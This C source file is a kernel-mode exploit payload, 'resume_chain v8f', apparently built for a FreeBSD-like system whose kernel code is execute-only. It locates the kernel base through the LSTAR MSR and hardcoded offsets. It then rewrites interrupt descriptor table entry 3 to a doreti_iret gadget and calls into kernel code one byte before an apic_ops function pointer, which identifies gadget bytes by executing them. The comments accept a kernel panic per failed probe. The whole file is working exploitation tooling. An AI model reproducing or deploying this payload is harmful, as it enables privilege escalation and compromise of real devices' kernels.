#include <stdint.h>

/*
 * resume_chain v8f — single-probe CC byte scanner
 *
 * Probes ONE apic_ops entry per deployment, selected by fw_ver.
 * fw_ver = 0xEE00 + entry_index (0..27)
 *
 * For the selected entry, CALLs fn-1 with sentinel in RAX:
 *   - If fn-1 = CC (INT3): IDT[3]=doreti_iret catches it, fn executes, returns
 *   - If fn-1 = C3 (ret):  immediate return, RAX = sentinel (unchanged)
 *   - If fn-1 = other:     kernel panic (reboot, try next candidate)
 *
 * ktext is XOM — cannot read bytes. Must EXECUTE to identify them.
 * pcb_onfault only catches #PF, NOT #UD/#GP — so non-CC/non-C3 = panic.
 * Single-probe-per-deployment limits blast radius to one reboot.
 *
 * Output layout (all in args buffer, 64 uint64_t slots):
 *   out[0]     = MAGIC (lo32) + status (hi32)
 *   out[1]     = kdata_base
 *   out[2]     = ktext_base
 *   out[3]     = td_pcb
 *   out[4..31] = apic_ops fn ptrs (from kdata, safe read)
 *   out[32]    = step progress
 *   out[33]    = target entry index
 *   out[34]    = target fn ptr
 *   out[35]    = call result (RAX after call to fn-1)
 *                sentinel (0xBAD0...) = C3 (ret)
 *                other value = CC (INT3 → fn executed → RAX changed)
 *   out[36]    = verdict: 0=unknown, 1=CC, 2=C3
 *   out[63]    = end marker
 *
 * Recommended probe order (by alignment + safety):
 *   fw_ver=0xEE02  → [2]  xapic_mode (CONTROL: known C3)
 *   fw_ver=0xEE18  → [24] timer_current_count (256-byte aligned, read-only)
 *   fw_ver=0xEE0E  → [14] set_lvt_mode (256-byte aligned)
 *   fw_ver=0xEE13  → [19] get_timer_freq (32-byte aligned, read-only)
 *   fw_ver=0xEE0A  → [10] ipi_wait (64-byte aligned)
 */

#define MAGIC_RSCN       0x5253434E
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218
#define OFF_APIC_OPS     0x1934AC8
#define OFF_IDT          0x64cdc80
#define OFF_DORETI_IRET  (-0x9cf84c)
#define IDT_ENTRY_SIZE   16
#define APIC_OPS_COUNT   28

#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

#define SENTINEL         0xBAD0BAD0BAD0BAD0ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    write2(idt_entry_addr + 0, (uint16_t)(handler & 0xFFFF));
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    write2(idt_entry_addr + 6, (uint16_t)((handler >> 16) & 0xFFFF));
    write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
}

/*
 * Call fn-1 with sentinel in RAX.
 * Returns RAX value after the call.
 *
 * NOTE: pcb_onfault only catches #PF. If fn-1 is not CC or C3,
 * the resulting #UD/#GP will NOT be caught → kernel panic.
 * This is expected and acceptable for single-probe-per-deployment.
 */
static uint64_t probe_fn_minus1(uint64_t fn_minus1, uint64_t onfault_addr)
{
    uint64_t result;
    __asm__ volatile(
        /* Arm pcb_onfault for #PF recovery (won't help with #UD/#GP) */
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"

        /* Load sentinel into RAX, then call fn-1 */
        "movabsq $0xBAD0BAD0BAD0BAD0, %%rax\n\t"
        "callq *%[target]\n\t"

        /* Success path: save RAX result */
        "movq %%rax, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        /* Fault recovery (only reached on #PF) */
        "2:\n\t"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"

        "1:\n\t"
        : [result] "=&r"(result)
        : [target] "r"(fn_minus1), [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "memory", "cc"
    );
    return result;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    /* Extract target entry index from fw_ver */
    int target_idx = (int)(fw_ver & 0xFF);

    /* Clear output buffer */
    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;

    out[1] = kdata_base;
    out[2] = ktext_base;
    out[32] = 0x01;  /* step: starting */

    /* Validate target index */
    if (target_idx >= APIC_OPS_COUNT) {
        out[33] = target_idx;
        out32[1] = 0x00FE;  /* invalid index */
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;
        return 0;
    }

    /* Get curthread → td_pcb → onfault_addr */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);
    out[3] = td_pcb;

    if (!td_pcb) {
        out32[1] = 0x00FF;  /* no PCB */
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;
        return 0;
    }

    uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

    /* Read all 28 fn ptrs from kdata (proven safe) */
    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
    for (int i = 0; i < APIC_OPS_COUNT; i++)
        out[4 + i] = read8(apic_ops_addr + i * 8);

    out[32] = 0x02;  /* step: fn ptrs read */

    /* Get target fn ptr */
    uint64_t fn = out[4 + target_idx];
    out[33] = target_idx;
    out[34] = fn;

    if (fn == 0) {
        out[35] = 0;
        out[36] = 0;  /* unknown — NULL fn */
        out32[1] = 0x01F0;  /* complete, NULL target */
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;
        return 0;
    }

    /* Save original IDT[3] (16 bytes) */
    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
    uint64_t idt3_orig_lo = read8(idt3_addr);
    uint64_t idt3_orig_hi = read8(idt3_addr + 8);

    /* Set IDT[3] = doreti_iret, IST=0 (just iretq for INT3 recovery) */
    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
    idt_set_handler(idt3_addr, doreti_iret, 0);

    out[32] = 0x03;  /* step: IDT[3] armed */

    /* === SINGLE PROBE === */
    out[32] = 0x100 + target_idx;  /* step: probing entry */

    uint64_t result = probe_fn_minus1(fn - 1, onfault_addr);
    out[35] = result;

    /* Classify result */
    if (result == SENTINEL) {
        out[36] = 2;  /* C3 — ret, sentinel unchanged */
    } else if (result == 0xFAFAFAFAFAFAFAFAULL) {
        out[36] = 3;  /* faulted (#PF caught by pcb_onfault) */
    } else {
        out[36] = 1;  /* CC — INT3 → doreti_iret → fn executed → RAX changed */
    }

    /* Restore original IDT[3] */
    write8(idt3_addr, idt3_orig_lo);
    write8(idt3_addr + 8, idt3_orig_hi);

    out[32] = 0x04;  /* step: IDT restored */

    out[63] = 0xdeadbeefcafe008FULL;

    /* Write magic + status LAST */
    out32[1] = 0x018F;  /* v8f complete */
    __asm__ volatile("mfence" ::: "memory");
    out32[0] = MAGIC_RSCN;

    return 0;
}
